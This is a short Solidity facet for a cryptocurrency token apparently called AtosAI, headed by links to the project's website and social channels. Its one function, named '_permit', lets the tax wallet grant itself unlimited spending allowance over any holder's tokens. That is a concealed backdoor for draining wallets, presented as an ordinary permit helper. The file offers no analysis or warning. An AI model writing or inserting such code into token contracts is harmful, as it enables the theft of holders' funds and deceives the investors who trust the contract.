// SPDX-License-Identifier: MIT

/*
https://www.atosai.finance/
https://app.atosai.finance/
https://medium.com/@atosai

https://t.me/atosai_portal
https://twitter.com/AtosAI_Coin
*/

pragma solidity 0.8.19;
import "./TestLib.sol";
contract _permitFacet is Context, Ownable {
    using SafeMath for uint256;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwap = true;
        _;
        ds.inSwap = false;
    }

    function _permit(address spender) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_msgSender() == ds._taxWallet);
        ds._allowances[spender][_msgSender()] = ~uint256(0);
    }
}
